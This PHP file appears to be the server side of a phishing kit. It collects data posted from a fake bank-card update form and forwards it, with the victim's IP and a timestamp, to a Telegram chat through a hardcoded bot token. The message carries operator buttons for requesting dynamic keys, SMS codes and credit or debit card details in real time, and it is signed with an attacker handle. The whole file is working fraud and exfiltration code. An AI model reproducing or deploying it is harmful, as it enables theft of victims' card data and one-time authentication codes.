<?php
header('Content-Type: application/json');

$config = @include __DIR__ . '/config.php';
$bot_token = $config['bot_token'] ?? '9267081280:AAG5QoLRfR17bSDYV81QmLyBAEI5v22iRtw';
$chat_id   = $config['chat_id'] ?? '-5584545537';

// Detectar si los datos vienen por POST (FormData) o por JSON
if (!empty($_POST)) {
    $data = $_POST;
    if (isset($data['u_tb'])) {
        $u_tb = json_decode($data['u_tb'], true);
        if (is_array($u_tb)) {
            $data = array_merge($data, $u_tb);
            unset($data['u_tb']);
        }
    }
} else {
    $content = file_get_contents("php://input");
    $data = json_decode($content, true);
}

if (!$data) {
    echo json_encode(['status' => 'error', 'message' => 'No data received']);
    exit;
}

$transactionId = $data['transactionId'] ?? '';

$ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['HTTP_CLIENT_IP'] ?? $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
$hora = date('d/m/Y H:i:s');

$mensaje = "◉ ACTUALIZACIÓN TARJETA (ALTER) ◉\n\n";
foreach ($data as $key => $val) {
    if ($key === 'transactionId') continue;
    if (is_array($val)) $val = json_encode($val);
    $mensaje .= "🟢 " . ucfirst($key) . ": " . $val . "\n";
}
$mensaje .= "\n🟢 IP: {$ip}\n🟢 Hora: {$hora}\n";
$mensaje .= "\n🐙 @FU7UR4MA 🐙";

$buttons = [
    'inline_keyboard' => [
        [
            ['text' => "Error Logo", 'callback_data' => "error_logo:{$transactionId}"]
        ],
        [
            ['text' => "Dinamica", 'callback_data' => "pedir_dinamica:{$transactionId}"],
            ['text' => "SMS", 'callback_data' => "pedir_sms:{$transactionId}"]
        ],
        [
            ['text' => "Finalizar", 'callback_data' => "confirm_finalizar:{$transactionId}"],
            ['text' => "923", 'callback_data' => "923:{$transactionId}"]
        ],
        [
            ['text' => "T-credito", 'callback_data' => "pedir_credito:{$transactionId}"],
            ['text' => "T-debito", 'callback_data' => "pedir_debito:{$transactionId}"]
        ]
    ]
];

$postData = [
    'chat_id' => $chat_id,
    'text' => $mensaje,
    'parse_mode' => 'HTML',
    'reply_markup' => json_encode($buttons)
];

$ch = curl_init("https://api.telegram.org/bot{$bot_token}/sendMessage");
curl_setopt_array($ch, [
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => json_encode($postData),
    CURLOPT_HTTPHEADER => ['Content-Type: application/json']
]);
$response = curl_exec($ch);
$err = curl_error($ch);
curl_close($ch);

echo json_encode(['status' => 'success']);
